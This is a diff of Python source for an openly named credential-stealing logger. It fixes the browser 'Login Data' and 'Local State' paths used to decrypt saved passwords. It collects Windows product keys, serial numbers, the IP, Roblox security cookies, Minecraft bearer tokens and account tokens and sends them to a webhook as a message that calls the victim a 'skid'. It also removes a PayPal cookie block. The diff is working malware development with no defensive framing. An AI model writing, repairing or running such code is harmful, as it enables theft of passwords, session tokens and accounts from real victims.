@@ -25,7 +25,7 @@ from sys import argv
 
 
 DBP = r'Google\Chrome\User Data\Default\Login Data'
-EBP = r'Microsoft\Edge\User Data\Default'
+EBP = r'Microsoft\Edge\User Data\Default\Login Data'
 MCBP = r'.minecraft\launcher_accounts.json'
 OBP = r'\Opera Software\Opera Stable'
 BBP = r'\BraveSoftware\Brave-Browser\User Data\Default'
@@ -154,7 +154,7 @@ class chrome:
 
 def localdata2():
     jsn = None
-    with open(os.path.join(os.environ['LOCALAPPDATA'], r"\Microsoft\Edge\User Data\Default"), encoding='utf-8', mode="r") as f:
+    with open(os.path.join(os.environ['LOCALAPPDATA'], r"\Microsoft\Edge\User Data\Default\Local State"), encoding='utf-8', mode="r") as f:
         jsn = json.loads(str(f.readline()))
     return jsn["os_crypt"]["encrypted_key"]
 
@@ -517,23 +517,12 @@ def beamed():
     except:
         pass
 
-    """read data => if we find a matching positive for our specified variable 'cookie', send it to our webhook."""
-    try:
-        for y in cookie3:
-            send = str([str(x) for x in cookies if y in str(x)])
-            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
-            for z in chunks:
-                pp = f'```' + f'{z}' + '```'
-    except:
-        pass
-
     """attempt to send all recieved data to our specified webhook"""
     try:
-        embed = Embed(title='[2qK Logger]',description='A victim\'s data was extracted and we have succesfully linked to the skids computer, here\'s the details:',color=16724480,timestamp='now')
-        embed.add_field("Windows Information:",f"User => {usr}\nWinType => {types}\nWinKey => {keys}\nEncryption =>  {el}\nManufacture => {sd}\nSerialNumber => {sn}\nFirst PowerOn => {pid}\nLatest PowerOn => {pvn}\nIP => {hostname}")
+        embed = Embed(title='[War Logger => Extracted and logged {usr}',description='A victim\'s data was extracted and we have succesfully linked to the skids computer, here\'s the details:',color=16724480,timestamp='now')
+        embed.add_field("Windows Information:",f"WinType => {types}\nWinKey => {keys}\nEncryption =>  {el}\nManufacture => {sd}\nSerialNumber => {sn}\nFirst PowerOn => {pid}\nLatest PowerOn => {pvn}\nIP => {hostname}")
         embed.add_field("Roblox Security:",roblox)
         embed.add_field("Minecraft Token:",bearer)
-        embed.add_field("Paypal Token:",pp)
         embed.add_field("Tokens:",message)
         embed.set_thumbnail(url='https://i.pinimg.com/originals/ce/88/36/ce88360f298f896ebec80e4e1bdd9f28.jpg')
         embed.set_image(url=upload())
